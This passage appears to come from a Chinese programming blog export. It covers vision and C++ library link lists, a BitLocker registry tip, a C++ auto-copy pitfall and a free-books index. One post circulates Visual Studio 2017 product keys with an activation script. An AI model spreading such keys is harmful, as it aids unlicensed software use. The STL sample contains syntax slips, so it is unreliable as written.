MIT LabelMe&nbsp;– Online annotation tool for building computer vision databases. Scene Recognition MIT SUN Dataset&nbsp;– MIT scene understanding dataset. UIUC Fifteen Scene Categories&nbsp;– Dataset of 15 natural scene categories. Feature Detection and Description VGG Affine Dataset&nbsp;– Widely used dataset for measuring performance of feature detection and description. CheckVLBenchmarksfor an evaluation framework. Action Recognition Benchmarking Activity Recognition&nbsp;– CVPR 2012 tutorial covering various datasets for action recognition. RGBD Recognition RGB-D Object Dataset&nbsp;– Dataset containing 300 common household objects Reference: &nbsp; [1]:&nbsp;http://rogerioferis.com/VisualRecognitionAndSearch/Resources.html 特征提取 SURF特征:&nbsp;http://www.vision.ee.ethz.ch/software/index.de.html(当然这只是其中之一) LBP特征(一种纹理特征)：http://www.comp.hkbu.edu.hk/~icpr06/tutorials/Pietikainen.html Fast Corner Detection（OpenCV中的Fast算法）:FAST Corner Detection -- Edward Rosten 机器视觉 A simple object detector with boosting(Awarded the Best Short Course Prize at ICCV 2005，So了解adaboost的推荐之作)：http://people.csail.mit.edu/torralba/shortCourseRLOC/boosting/boosting.html Boosting(该网页上有相当全的Boosting的文章和几个Boosting代码，本人推荐)：http://cbio.mskcc.org/~aarvey/boosting_papers.html Adaboost Matlab 工具：http://graphics.cs.msu.ru/en/science/research/machinelearning/adaboosttoolbox MultiBoost(不说啥了，多类Adaboost算法的程序)：http://sourceforge.net/projects/multiboost/ TextonBoost(我们教研室王冠夫师兄的毕设):&nbsp;Jamie Shotton - Code LibSvm的老爹（推荐）:&nbsp;http://www.csie.ntu.edu.tw/~cjlin/ Conditional Random Fields（CRF论文+Code列表，推荐） CRF++: Yet Another CRF toolkit Conditional Random Field (CRF) Toolbox for Matlab Tree CRFs LingPipe: Installation Hidden Markov Models（推荐） 隐马尔科夫模型(Hidden Markov Models)系列之一&nbsp;- eaglex的专栏 - 博客频道&nbsp;- CSDN.NET（推荐） 综合代码 CvPapers(好吧，牛吧网站，里面有ICCV，CVPR，ECCV，SIGGRAPH的论文收录，然后还有一些论文的代码搜集，要求加精！)：http://www.cvpapers.com/ Computer Vision Software(里面代码很多，并详细的给出了分类)：http://peipa.essex.ac.uk/info/software.html 某人的Windows Live（我看里面东东不少就收藏了）：https://skydrive.live.com/?cid=3b6244088fd5a769#cid=3B6244088FD5A769&amp;id=3B6244088FD5A769!523 MATLAB and Octave Functions for Computer Vision and Image Processing（这个里面的东西也很全，只是都是用Matlab和Octave开发的）：http://www.csse.uwa.edu.au/~pk/research/matlabfns/ Computer Vision Resources（里面的视觉算法很多，给出了相应的论文和Code，挺好的）：https://netfiles.uiuc.edu/jbhuang1/www/resources/vision/index.html MATLAB Functions for Multiple View Geometry（关于物体多视角计算的库）：http://www.robots.ox.ac.uk/~vgg/hzbook/code/ Evolutive Algorithm based on Naïve Bayes models Estimation（单独列了一个算法的Code）：http://www.cvc.uab.cat/~xbaro/eanbe/#_Software 主页代码 Pablo Negri's Home Page Jianxin Wu's homepage Peter Carbonetto Markov Random Fields for Super-Resolution Detecting and Sketching the Common Pedro Felzenszwalb Hae JONG, SEO CAP 5416 - Computer Vision Parallel Tracking and Mapping for Small AR Workspaces (PTAM) Deva Ramanan - UC Irvine - Computer Vision Raghuraman Gopalan Hui Kong Jamie Shotton - Post-Doctoral Researcher in Computer Vision Jean-Yves AUDIBERT Olga Veksler Stephen Gould Publications (Last Update: 09/30/10) Karim Ali - FlowBoost A simple parts and structure object detector Code - Oxford Brookes Vision Group Taku Kudo 行人检测 Histogram of Oriented Gradient (Windows) INRIA Pedestrian detector Poselets William Robson Schwartz - Softwares calvin upper-body detector v1.02 RPT@CVG Main Page Source Code Dr. Luciano Spinello Pedestrian Detection Class-Specific Hough Forests for Object Detection Jianxin Wu's homepage（就是上面的） Berkeley大学做的Pedestrian Detector，使用交叉核的支持向量机，特征使用HOG金字塔，提供Matlab和C++混编的代码：http://www.cs.berkeley.edu/~smaji/projects/ped-detector/ 视觉壁障 High Speed Obstacle Avoidance using Monocular Vision and Reinforcement Learning TLD(2010年很火的tracking算法) online boosting trackers Boris Babenko Optical Flow Algorithm Evaluation (提供了一个动态贝叶斯网络框架，例如递 归信息处理与分析、卡尔曼滤波、粒子滤波、序列蒙特卡罗方法等，C++写的)http://of-eval.sourceforge.net/ 物体检测算法 Object Detection Software for object detection 人脸检测 Source Code 10个人脸检测项目 Jianxin Wu's homepage（又是这货） ICA独立成分分析 An ICA page-papers,code,demo,links (Tony Bell) FastICA Cached k-d tree search for ICP algorithms 滤波算法 卡尔曼滤波：The Kalman Filter(终极网页) Bayesian Filtering Library:&nbsp;The Bayesian Filtering Library 路面识别 Source Code Vanishing point detection for general road detection 分割算法 MATLAB Normalized Cuts Segmentation Code：software 超像素分割：SLIC Superpixels","tags":"计算机视觉 computer-vision-resources"},{"title":"常见的C++数学计算库","url":"/20210506/chang-jian-de-c-shu-xue-ji-suan-ku/","text":"转载来源： https://blog.csdn.net/panhao762/article/details/55276811 经过up主校正，可放心食用 ※计算几何算法库 CGAL CGAL ，计算几何算法库，是一个大型C + +库的几何数据结构和算法，如Delaunay三角网，网格生成，布尔运算的多边形，以及各种几何处理算法。 CGAL是用来在各个领域：计算机图形学，科学可视化，计算机辅助设计与建模，地理信息系统，分子生物学，医学影像学，机器人学和运动规划，和数值方法。下载网址： http://www.cgal.org/download.html ※数学软件包 Octave Octave 是一个类似matlab和Scilab的数学软件包，可以进行各种运算，编程。它还有丰富的C接口可以让用户编程时调用。它绘图使用gnuplot。 Octave的使用也是基于字符终端模式的，当需要绘图时，将会调用Gnuplot进行数据绘图，并显示出来。 Octave是用C编写的，它内容丰富的库也可以供用户在编写软件时调用。Octave库的详细介绍在/usr/share/doc/octave-2.1.50/liboctave下，文件是liboctave.dvi，需要PDF文件的，可以运行： dvipdfm liboctave.dvi 将dvi文件转换为PDF文件。 Octave同时还支持Fortran等的调用，GSL绑定等。可以由用户定制自己的函数、子程序等。下载地址 http://octave.sourceforge.net/packages.html ※有限元分析软件 OpenFEM 有限元分析，即使用有限元方法来分析静态或动态的物体或系统。在这种方法中一个物体或系统被分解为由多个相互联结的、简单、独立的点组成的几何模型。在这 种方法中这些独立的点的数量是有限的，因此被称为有限元。由实际的物理模型中推导出来得平衡方程式被使用到每个点上，由此产生了一个方程组。这个方程组可 以用线性代数的方法来求解。有限元分析的精确度无法无限提高。元的数目到达一定高度后解的精确度不再提高，只有计算时间不断提高。下载地址 http://sourceforge.net/projects/openfem/files/ ※有限元计算框架 OOFEM OOFEM 是一个开源多物理并行有限元程序的面向对象的架构。这个项目的目的是提供高效率和强大的有限元计算工具，以及提供高度模块化和可扩展性的发展环境。有限元分析通常借助计算机软件完成，著名工程软件有：MSC.Nastran、ADINA、LS-DYNA、ANSYS、ABAQUS、2D-sigma等。下载地址 http://www.oofem.org/en/download ※C++符号计算库 GiNaC GiNaC（GiNaC 不是一个 CAS 计算机代数系统））是一个用于符号计算的C++库。它的设计允许集成系统创造，象征性的操作嵌入与更成熟的计算机科学（如计算密集型，图形界面等），数字应用领域。相对于其他情况下，它不会尝试代数提供广泛的功能和简单的编程语言，而是接受一个给定语言（C + +）和扩展了代数功能设置。下载地址 http://www.ginac.de/Download.html ※类C的数学专用语言EngLab EngLab是一个类C的数学专用语言。它语法简单，关键字很少，工程师和那些只会少许编程知识的人便能很好的掌握。下载地址http://sourceforge.net/projects/englab/files/ ※C信号处理库 SP TSPL(Template Signal Processing Library) 是一个 C++ 的信号处理库，主要包括滤波器设计、时频分析和小波变换，同时还包含一些关于向量和矩阵的基本算法，所有的算法基于 C++ 模板类编写而成。下载地址http://code.google.com/p/tspl/downloads/list ※偏微分方程求解工具箱 DUNE（目前还不支持windows系统） DUNE (Distributed and Unified Numerics Environment)，分布和统一数值解环境，是一种求解偏微分方程的基于网格的方法（PDE）的模块化的工具箱。DUNE是所有这些体现了科学计算的概念从抽象的接口设置第一次。现代C + +编程技术使同样的概念非常不同的实现使用一个非常低的开销一个共同的接口。因此，DUNE确保在科学计算的效率，并支持高性能计算应用。下载地址 https://www.dune-project.org/ ※线性算术的C++模板库 Eigen Eigen 是一个线性算术的C++模板库，包括：vectors, matrices, 以及相关算法。功能强大、快速、优雅以及支持多平台。下载地址 http://eigen.tuxfamily.org/index.php?title=Main_Page ※多精度整数和有理数 MPIR MPIR 是一个开源的多精度的整数和有理数计算库，基于 GMP 库开发。下载地址http://www.mpir.org/mpir-1.3.1.tar.gz ※C/C++数值计算库 mygsl mygsl是一个基于GSL库的个性化开源数值计算项目. 下载地址 https://sourceforge.net/projects/mygsl/","tags":"c++ 数学计算库"},{"title":"win10-BitLocker专题","url":"/20210430/win10-bitlocker-zhuan-ti/","text":"BitLocker 不需要重启加锁方法:管理员运行manage-bde.exe E: -lock -fd 当使用BitLocker给磁盘上锁后，可以通过命令：manage-bde -lock d: -forcedismount 将已经解锁的磁盘重新上锁，如果觉得每次都通过命令行写命令很麻烦，那可以通过修改注册表的方式在右键菜单上增加一个上锁功能。步骤如下： 打开注册表编辑器 在键值【HKEY_CLASSES_ROOT\\Drive\\shell】下添加项【runas】，然后将默认值修改为【lock】，这个可以随便自定义，就是右键菜单中菜单项显示的字 在【runas】下添加【command】项，然后修改默认值为【c:\\windows\\System32\\manage-bde.exe d: -lock】（如果加密盘符为d:） 关闭注册表编辑器，就可以直接使用了。","tags":"专题 bitlocker"},{"title":"c++ stl中容器使用的小技巧及坑1","url":"/20210422/c-stl-zhong-rong-qi-shi-yong-de-xiao-ji-qiao-ji-keng-1/","text":"以vector为例，在使用auto 关键字重命名容器时容易遇到，使用新命名变量操作容器时，明明已经clear或erase掉了容器，但是再次绑定使用容器时发现容器仍然有数据，未删除数据。示例代码如下： 1234567891011121314using namespace std;vector&lt;int&gt; asdfghjklqwertyuio[100][100];...for(int i=0i&lt;100;i++)&#123; for(int j=0;j&lt;100;j++) &#123; auto vec=asdfghjklqwertyuio[i][j]; vec.size();//这里重新进入大小都会恢复，造成上次clear没有清理/删除的假象 vec.clear(); vec.erase(vec.begin(),vec.begin()+10; vec.size();//这里会变为0 &#125;&#125; 究其原因是因为 auto vec=asdfghjklqwertyuio[i][j]; 采用了拷贝机制，vec为 asdfghjklqwertyuio[i][j] 的副本，对vec的操作并未作用到原始容器中，而只是对vec的操作。 解决方法： 使用左值引用（建议） auto&amp; vec=asdfghjklqwertyuio[i][j]; 使用骚操作指针 auto vec=&amp;asdfghjklqwertyuio[i][j]; 后期使用容器时使用 (*vec).begin()等等。 ———————————————— 版权声明：本文为CSDN博主「紫霄宫中布道者」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/yaokingson/article/details/116015000","tags":"c++ stl"},{"title":"vs2017离线激活脚本","url":"/20210421/vs2017-chi-xian-ji-huo-jiao-ben/","text":"Visual Studio 2017（VS2017） 企业版(Enterprise) key：NJVYC-BMHX2-G77MM-4XJMR-6Q8QF Visual Studio 2017（VS2017） 专业版(Professional) key：KBJFW-NXHK6-W4WJM-CRMQB-G3CDH 1234567cd ./certificatesmanifestCounterSignCertificates.p12manifestSignCertificates.p12vs_installer_opc.SignCertificates.p12cd ..vs_Enterprise.exepause 安装目录下新建 .txt 文本文件，将以上脚本代码保存到文本文件中，并将文件扩展名修改为 .bat ；双击运行即可。弹出的证书文件选默认，下一步即可。","tags":"visual-studio"},{"title":"近 7 百本免费中文编程教程电子书汇总 - 程序员开发入门学习资源大搜集","url":"/20210421/jin-7-bai-ben-mian-fei-zhong-wen-bian-cheng-jiao-cheng-dian-zi-shu-hui-zong-cheng-xu-yuan-kai-fa-ru-men-xue-xi-zi-yuan-da-sou-ji/","text":"转载自 https://www.iplaysoft.com/free-programming-books.htm 略有删减 原贴 https://github.com/justjavac/free-programming-books-zh_CN 由于内容较多，大家可以善用浏览器的 CTRL+F 进行关键字搜索。 ※新版 目录 语言无关类 操作系统 智能系统 分布式系统 编译原理 函数式概念 计算机图形学 WEB服务器 版本控制 编辑器 NoSQL PostgreSQL MySQL 管理和监控 项目相关 设计模式 Web 大数据 编程艺术 其它 语言相关类 Android APP AWK C/C++ C# Clojure CSS/HTML Dart Elixir Erlang Fortran Go Groovy Haskell iOS Java JavaScript Kotlin LaTeX LISP Lua OCaml Perl PHP Prolog Python R Ruby Rust Scala Shell Swift 读书笔记及其它 测试相关 置顶 [笔记]前端工程师的入门与进阶 💯 [全文]如何正确的学习 Node.js 💯 操作系统 开源世界旅行手册 鸟哥的Linux私房菜 The Linux Command Line (中英文版) Linux 设备驱动 (第三版) 深入分析Linux内核源码 😟 UNIX TOOLBOX Docker中文指南 Docker —— 从入门到实践 Docker入门实战 Docker Cheat Sheet FreeRADIUS新手入门 😟 Mac 开发配置手册 FreeBSD 使用手册 Linux 命令行(中文版) Linux 构建指南 Linux工具快速教程 Linux Documentation (中文版) 嵌入式 Linux 知识库 (eLinux.org 中文版) 理解Linux进程 命令行的艺术 SystemTap新手指南 操作系统思考 返回目录 智能系统 一步步搭建物联网系统 返回目录 分布式系统 走向分布式 返回目录 编译原理 《计算机程序的结构和解释》公开课 翻译项目 返回目录 函数式概念 傻瓜函数编程 返回目录 计算机图形学 OpenGL 教程 WebGL自学网 😟 《Real-Time Rendering 3rd》提炼总结 返回目录 WEB服务器 Nginx开发从入门到精通 (淘宝团队出品) Nginx教程从入门到精通(PDF版本，运维生存时间出品) OpenResty最佳实践 Apache 中文手册 返回目录 版本控制 Git教程 （本文由 廖雪峰 创作，如果觉得本教程对您有帮助，可以去 iTunes 购买） git - 简易指南 猴子都能懂的GIT入门 Git 参考手册 Pro Git Pro Git 中文版 (整理在gitbook上) Git Magic GotGitHub Git权威指南 Git Community Book 中文版 Mercurial 使用教程 HgInit (中文版) 沉浸式学 Git Git-Cheat-Sheet （感谢 @flyhigher139 翻译了中文版） GitHub秘籍 GitHub帮助文档 git-flow 备忘清单 svn 手册 GitHub漫游指南 返回目录 编辑器 exvim--vim 改良成IDE项目 笨方法学Vimscript 中译本 😟 Vim中文文档 所需即所获：像 IDE 一样使用 vim vim 实操教程 Atom飞行手册中文版 Markdown·简单的世界 一年成为 Emacs 高手 Emacs 生存指南 Atom官方手册 返回目录 NoSQL NoSQL数据库笔谈 Redis 设计与实现 Redis 命令参考 带有详细注释的 Redis 3.0 代码 带有详细注释的 Redis 2.6 代码 The Little MongoDB Book The Little Redis Book Neo4j 简体中文手册 v1.8 Neo4j .rb 中文資源 Disque 使用教程 Apache Spark 设计与实现 返回目录 PostgreSQL PostgreSQL 8.2.3 中文文档 PostgreSQL 9.3.1 中文文档 PostgreSQL 9.5.3 中文文档 返回目录 MySQL MySQL索引背后的数据结构及算法原理 21分钟MySQL入门教程 返回目录 管理和监控 ELKstack 中文指南 Mastering Elasticsearch(中文版) ElasticSearch 权威指南 Elasticsearch 权威指南（中文版） Logstash 最佳实践 Puppet 2.7 Cookbook 中文版 返回目录 项目相关 持续集成（第二版） (译言网) 让开发自动化系列专栏 追求代码质量 selenium 中文文档 Selenium Webdriver 简易教程 Joel谈软件 約耳談軟體(Joel on Software) Gradle 2 用户指南 Gradle 中文使用文档 编码规范 开源软件架构 GNU make 指南 GNU make 中文手册 The Twelve-Factor App 返回目录 设计模式 图说设计模式 史上最全设计模式导学目录 design pattern 包教不包会 设计模式 Java 版 返回目录 Web 关于浏览器和网络的 20 项须知 浏览器开发工具的秘密 Chrome 开发者工具中文手册 Chrome扩展开发文档 Grunt中文文档 gulp中文文档 Gulp 入门指南 移动Web前端知识库 正则表达式30分钟入门教程 前端开发体系建设日记 移动前端开发收藏夹 JSON风格指南 HTTP 接口设计指北 前端资源分享（一） 前端资源分享（二） 前端代码规范 及 最佳实践 前端开发者手册 前端工程师手册 w3school教程整理 Wireshark用户手册 一站式学习Wireshark HTTP 下午茶 HTTP/2.0 中文翻译 RFC 7540 - HTTP/2 中文翻译版 http2讲解 3 Web Designs in 3 Weeks 站点可靠性工程 Web安全学习笔记 Serverless 架构应用开发指南 返回目录 大数据 大数据/数据挖掘/推荐系统/机器学习相关资源 面向程序员的数据挖掘指南 大型集群上的快速和通用数据处理架构 数据挖掘中经典的算法实现和详细的注释 Spark 编程指南简体中文版 返回目录 编程艺术 程序员编程艺术 每个程序员都应该了解的内存知识(译)【第一部分】 取悦的工序：如何理解游戏 (豆瓣阅读，免费书籍) 返回目录 其它 OpenWrt智能、自动、透明翻墙路由器教程 SAN 管理入门系列 Sketch 中文手册 深入理解并行编程 程序员的自我修养 Growth: 全栈增长工程师指南 系统重构与迁移指南 返回目录 Android Android Design(中文版) Google Material Design 正體中文版 (译本一 译本二) Material Design 中文版 Google Android官方培训课程中文版 Android学习之路 Android开发技术前线(android-tech-frontier) Point-of-Android Android 一些重要知识点解析整理 Android6.0新特性详解 返回目录 APP Apache Cordova 开发指南 返回目录 AWK awk程序设计语言 awk中文指南 awk实战指南 返回目录 C/C++ C/C++ 中文参考手册 (欢迎大家参与在线翻译和校对) C 语言编程透视 C++ 并发编程指南 Linux C编程一站式学习 (宋劲杉, 北京亚嵌教育研究中心) CGDB中文手册 100个gdb小技巧 100个gcc小技巧 ZMQ 指南 How to Think Like a Computer Scientist (中英文版) 跟我一起写 Makefile GNU make中文手册 (需科学上网) (PDF) GNU make 指南 Google C++ 风格指南 C/C++ Primer (by @andycai) 简单易懂的C魔法 C++ FAQ LITE(中文版) C++ Primer 5th Answers C++ 并发编程(基于C++11) QT 教程 DevBean的《Qt学习之路2》(Qt5) 中文版《QmlBook》 C++ Template 进阶指南 libuv中文教程 Boost 库中文教程 笨办法学C 高速上手 C++11/14/17 返回目录 C# Microsoft Docs C# 官方文档 ASP.NET MVC 5 入门指南 超全面的 .NET GDI+ 图形图像编程教程 .NET控件开发基础 .NET开发要点精讲（初稿） 返回目录 Clojure Clojure入门教程 返回目录 CSS/HTML 学习CSS布局 通用 CSS 笔记、建议与指导 CSS参考手册 Emmet 文档 前端代码规范 (腾讯 AlloyTeam 团队) HTML和CSS编码规范 Sass Guidelines 中文 CSS3 Tutorial 《CSS3 教程》 MDN HTML 中文文档 MDN CSS 中文文档 返回目录 Dart Dart 语言导览 返回目录 Elixir Elixir编程入门 返回目录 Erlang 21天学通Erlang 返回目录 Fortran Fortran77和90/95编程入门 返回目录 Go Go编程基础 Go入门指南 学习Go语言 Go Web 编程 (此书已经出版，希望开发者们去购买，支持作者的创作) Go实战开发 (当我收录此项目时，作者已经写完第三章，如果读完前面章节觉得有帮助，可以给作者捐赠，以鼓励作者的继续创作) Network programming with Go 中文翻译版本 Effective Go Go 语言标准库 Golang标准库文档 Revel 框架手册 Java程序员的Golang入门指南 Go命令教程 Go语言博客实践 Go 官方文档翻译 深入解析Go Go语言圣经(中文版) (GitBook) golang runtime源码分析 Go语言实战: 编写可维护Go语言代码建议 Golang 系列教程(译) Go RPC 开发指南GitBook Go语言高级编程 Go2编程指南 Go语言设计模式 Go语言四十二章经 返回目录 Groovy 实战 Groovy 系列 返回目录 Haskell Real World Haskell 中文版 Haskell趣学指南 返回目录 iOS iOS开发60分钟入门 iOS7人机界面指南 Google Objective-C Style Guide 中文版 iPhone 6 屏幕揭秘 Apple Watch开发初探 马上着手开发 iOS 应用程序 网易斯坦福大学公开课：iOS 7应用开发字幕文件 返回目录 Java Apache Shiro 用户指南 Jersey 2.x 用户指南 Spring Framework 4.x参考文档 Spring Boot参考指南 (翻译中) MyBatis中文文档 MyBatis Generator 中文文档 用jersey构建REST服务 Activiti 5.x 用户指南 Google Java编程风格指南 Netty 4.x 用户指南 Netty 实战(精髓) REST 实战 Java 编码规范 Apache MINA 2 用户指南 H2 Database 教程 Java Servlet 3.1 规范 JSSE 参考指南 Java开源实现及最佳实践 Java 编程要点 Think Java Java 8 简明教程 On Java 8 中文版 (翻译中) Effective Java 第3版中文版 返回目录 JavaScript 现代 Javascript 教程 Google JavaScript 代码风格指南 Google JSON 风格指南 Airbnb JavaScript 规范 JavaScript 标准参考教程（alpha） Javascript编程指南 (源码) javascript 的 12 个怪癖 JavaScript 秘密花园 JavaScript核心概念及实践 (PDF) (此书已由人民邮电出版社出版发行，但作者依然免费提供PDF版本，希望开发者们去购买，支持作者) 《JavaScript 模式》 “JavaScript patterns”中译本 JavaScript语言精粹 命名函数表达式探秘 (注:原文由为之漫笔翻译，原始地址无法打开，所以此处地址为我博客上的备份) 学用 JavaScript 设计模式 (开源中国) 深入理解JavaScript系列 ECMAScript 5.1 中文版 ECMAScript 6 入门 (作者：阮一峰) JavaScript Promise迷你书 You-Dont-Know-JS (深入JavaScript语言核心机制的系列图书) JavaScript 教程 廖雪峰 MDN JavaScript 中文文档 jQuery jQuery 解构 简单易懂的JQuery魔法 How to write jQuery plugin You Don't Need jQuery 如何实现一个类jQuery？ Node.js Node入门 七天学会NodeJS Nodejs Wiki Book (繁体中文) express.js 中文文档 koa 中文文档 一起学koa 使用 Express + MongoDB 搭建多人博客 Express框架 Node.js 包教不包会 Learn You The Node.js For Much Win! (中文版) Node debug 三法三例 nodejs中文文档 orm2 中文文档 一起学 Node.js underscore.js Underscore.js中文文档 backbone.js backbone.js中文文档 backbone.js入门教程 (PDF) Backbone.js入门教程第二版 Developing Backbone.js Applications(中文版) AngularJS AngularJS最佳实践和风格指南 AngularJS中译本 AngularJS入门教程 构建自己的AngularJS 在Windows环境下用Yeoman构建AngularJS项目 Zepto.js Zepto.js 中文文档 Sea.js Hello Sea.js React.js React 学习之道 React.js 小书 React.js 中文文档 React webpack-cookbook React 入门教程 React 入门教程 (作者：hulufei, 与上行不同作者) React Native 中文文档(含最新Android内容) Learn React &amp; Webpack by building the Hacker News front page impress.js impress.js的中文教程 CoffeeScript CoffeeScript Cookbook The Little Book on CoffeeScript中文版 CoffeeScript 编码风格指南 TypeScipt TypeScript Handbook ExtJS Ext4.1.0 中文文档 Meteor Discover Meteor Meteor 中文文档 Angular-Meteor 中文教程 VueJS 逐行剖析 Vue.js 源码 Chrome扩展及应用开发 Kotlin Kotlin 官方参考文档 中文版 Kotlin 中文文档 GitHub Kotlin 参考文档 《Kotlin for android developers》中文版 返回目录 LaTeX 一份其实很短的 LaTeX 入门文档 一份不太简短的 LATEX 2ε 介绍 （PDF版） 返回目录 LISP Common Lisp ANSI Common Lisp 中文翻譯版 On Lisp 中文翻译版本 Scheme Yet Another Scheme Tutorial Scheme入门教程 Scheme语言简明教程 Racket Racket book 返回目录 Lua Lua编程入门 Lua 5.1 参考手册 中文翻译 Lua 5.3 参考手册 中文翻译 Lua源码欣赏 返回目录 OCaml Real World OCaml 返回目录 Perl Modern Perl 中文版 Perl 程序员应该知道的事 返回目录 PHP PHP 官方手册 PHP调试技术手册(PDF) PHP之道：php-the-right-way (@wulijun版 PHPHub版) PHP 最佳实践 PHP 开发者实践 深入理解PHP内核 PHP扩展开发及内核应用 Laravel5.1 中文文档 Laravel 5.1 LTS 速查表 Symfony2 Cookbook 中文版(版本 2.7.0 LTS) Symfony2中文文档 (未译完) YiiBook几本Yii框架的在线教程 深入理解 Yii 2.0 Yii 框架中文官网 简单易懂的PHP魔法 swoole文档及入门教程 Composer 中文网 Slim 中文文档 Lumen 中文文档 PHPUnit 中文文档 PHP-LeetCode 返回目录 Prolog 笨办法学Prolog 返回目录 Python 廖雪峰 Python 2.7 中文教程 廖雪峰 Python 3 中文教程 简明Python教程 简明 Python 教程(Python 3) 零基础学 Python 第一版 零基础学 Python 第二版 可爱的 Python Python 2.7 官方教程中文版 Python 3.3 官方教程中文版 Python Cookbook 中文版 Python3 Cookbook 中文版 深入 Python 深入 Python 3 PEP8 Python代码风格规范 Google Python 风格指南 中文版 Python入门教程 (PDF) 笨办法学 Python (PDF EPUB) Python自然语言处理中文版 （感谢陈涛同学的翻译，也谢谢 @shwley 联系了作者） Python 绘图库 matplotlib 官方指南中文翻译 Scrapy 0.25 文档 ThinkPython ThinkPython 2ed Python快速教程 Python 正则表达式操作指南 python初级教程：入门详解 Twisted 与异步编程入门 TextGrocery 中文 API ( 基于svm算法的一个短文本分类 Python 库 ) Requests: HTTP for Humans Pillow 中文文档 PyMOTW 中文版 Python 官方文档中文版 Fabric 中文文档 Beautiful Soup 4.2.0 中文文档 Python 中的 Socket 编程 用Python做科学计算 Sphinx 中文文档 精通 Python 设计模式 python 安全编程教程 程序设计思想与方法 知乎周刊·编程小白学Python Scipy 讲义 Python 学习笔记 基础篇 Python 学习笔记 模块篇 Python 标准库 中文版 Python进阶 Python 核心编程 第二版 CPyUG译 Python最佳实践指南 Python 精要教程 Python 量化交易教程 Django Django 1.5 文档中文版 正在翻译中 Django 2.0 文档中文版 Django 最佳实践 Django 2.1 搭建个人博客教程 ( 编写中 ) Django搭建简易博客教程 The Django Book 中文版 Django 设计模式与最佳实践 Django 网站开发 Cookbook Django Girls 學習指南 Flask Flask 文档中文版 Jinja2 文档中文版 Werkzeug 文档中文版 Flask之旅 Flask 扩展文档汇总 Flask 大型教程 SQLAlchemy 中文文档 Flask 入门教程 web.py web.py 0.3 新手指南 Web.py Cookbook 简体中文版 Tornado Introduction to Tornado 中文翻译 Tornado源码解析 Tornado 4.3 文档中文版 返回目录 R R语言忍者秘笈 返回目录 Ruby Ruby 风格指南 Rails 风格指南 笨方法學 Ruby Ruby on Rails 指南 Ruby on Rails 實戰聖經 Ruby on Rails Tutorial 原书第 3 版 (本书网页版免费提供，电子版以 PDF、EPub 和 Mobi 格式提供购买，仅售 9.9 美元) Rails 实践 Rails 5 开发进阶(Beta) Rails 102 编写Ruby的C拓展 Ruby 源码解读 Ruby中的元编程 返回目录 Rust Rust编程语言 中文翻译 Rust Primer 返回目录 Scala Scala课堂 (Twitter的Scala中文教程) Effective Scala(Twitter的Scala最佳实践的中文翻译) Scala指南 返回目录 Shell Shell脚本编程30分钟入门 Bash脚本15分钟进阶教程 Linux工具快速教程 shell十三问 Shell编程范例 Linux命令搜索引擎 返回目录 Swift The Swift Programming Language 中文版 Swift 语言指南 Stanford 公开课，Developing iOS 8 Apps with Swift 字幕翻译文件 C4iOS - COSMOS 返回目录 读书笔记及其它 编译原理（紫龙书）中文第2版习题答案 把《编程珠玑》读薄 Effective C++读书笔记 Golang 学习笔记、Python 学习笔记、C 学习笔记 (PDF) Jsoup 学习笔记 学习笔记: Vim、Python、memcached 图灵开放书翻译计划--C++、Python、Java等 蒂姆·奥莱利随笔 （由译言网翻译，电子版免费） SICP 解题集 精彩博客集合 中文文案排版指北 Standard C 语言标准函数库速查 (Cheat Sheet) Git Cheatsheet Chs GitBook简明教程 制造开源软件 提问的智慧 Markdown 入门参考 AsciiDoc简明指南 背包问题九讲 老齐的技术资料 前端技能汇总 借助开源项目，学习软件开发 前端工作面试问题 leetcode/lintcode题解/算法学习笔记 前端开发笔记本 LeetCode题解 《不可替代的团队领袖培养计划》 返回目录 测试相关 ※旧版 编程语言类教程AndroidAPPAWKC/C++C#ClojureCSS/HTMLDartElixirErlangFortranGoGroovyHaskelliOSJavaJavaScriptKotlinLaTeXLISPLuaOCamlPerlPHPPrologPythonRRubyRustScalaShellSwift 计算机相关教程操作系统智能系统分布式系统编译原理函数式概念计算机图形学WEB服务器版本控制编辑器NoSQLPostgreSQLMySQL管理和监控项目相关设计模式Web大数据编程艺术其它AndroidAndroid Design(中文版)Google Material Design 繁体中文版 (译本一 译本二)Material Design 中文版Google Android官方培训课程中文版Android学习之路Android开发技术前线(android-tech-frontier)Point-of-Android Android 一些重要知识点解析整理Android6.0新特性详解「返回目录」APPApache Cordova 开发指南「返回目录」AWKawk程序设计语言awk中文指南「返回目录」C/C++C/C++ 中文参考手册C 语言编程透视C++ 并发编程指南Linux C编程一站式学习CGDB中文手册100个gdb小技巧100个gcc小技巧ZMQ 指南How to Think Like a Computer Scientist (中英文版)跟我一起写Makefile(PDF)GNU make中文手册GNU make 指南Google C++ 风格指南C/C++ Primer (by @andycai)简单易懂的C魔法C++ FAQ LITE(中文版)C++ Primer 5th AnswersC++ 并发编程(基于C++11)QT 教程DevBean的《Qt学习之路2》(Qt5)C++ Template 进阶指南libuv中文教程Boost 库中文教程笨办法学C高速上手 C++11/14/17「返回目录」C#MSDN C# 中文文档.NET 类库参考ASP.NET MVC 5 入门指南超全面的 .NET GDI+ 图形图像编程教程.NET控件开发基础.NET开发要点精讲（初稿）「返回目录」ClojureClojure入门教程「返回目录」CSS/HTML学习CSS布局通用 CSS 笔记、建议与指导CSS参考手册Emmet 文档前端代码规范 (腾讯 AlloyTeam 团队)HTML和CSS编码规范Sass Guidelines 中文CSS3 Tutorial 《CSS3 教程》MDN HTML 中文文档MDN CSS 中文文档「返回目录」DartDart 语言导览「返回目录」ElixirElixir编程入门「返回目录」Erlang21天学通Erlang「返回目录」FortranFortran77和90/95编程入门「返回目录」GoGo编程基础Go入门指南学习Go语言Go Web 编程 (此书已经出版，希望开发者们去购买，支持作者的创作)Go实战开发 (当我收录此项目时，作者已经写完第三章，如果读完前面章节觉得有帮助，可以给作者捐赠，以鼓励作者的继续创作)Network programming with Go 中文翻译版本Effective GoGo 语言标准库Golang标准库文档Revel 框架手册Java程序员的Golang入门指南Go命令教程Go语言博客实践Go 官方文档翻译深入解析GoGo语言圣经(中文版) (GitBook)「返回目录」Groovy实战 Groovy 系列「返回目录」HaskellReal World Haskell 中文版Haskell趣学指南「返回目录」iOSiOS开发60分钟入门iOS7人机界面指南Google Objective-C Style Guide 中文版iPhone 6 屏幕揭秘Apple Watch开发初探马上着手开发 iOS 应用程序网易斯坦福大学公开课：iOS 7应用开发字幕文件「返回目录」JavaApache Shiro 用户指南Jersey 2.x 用户指南Spring Framework 4.x参考文档Spring Boot参考指南 (翻译中)MyBatis中文文档MyBatis Generator 中文文档用jersey构建REST服务Activiti 5.x 用户指南Google Java编程风格指南Netty 4.x 用户指南Netty 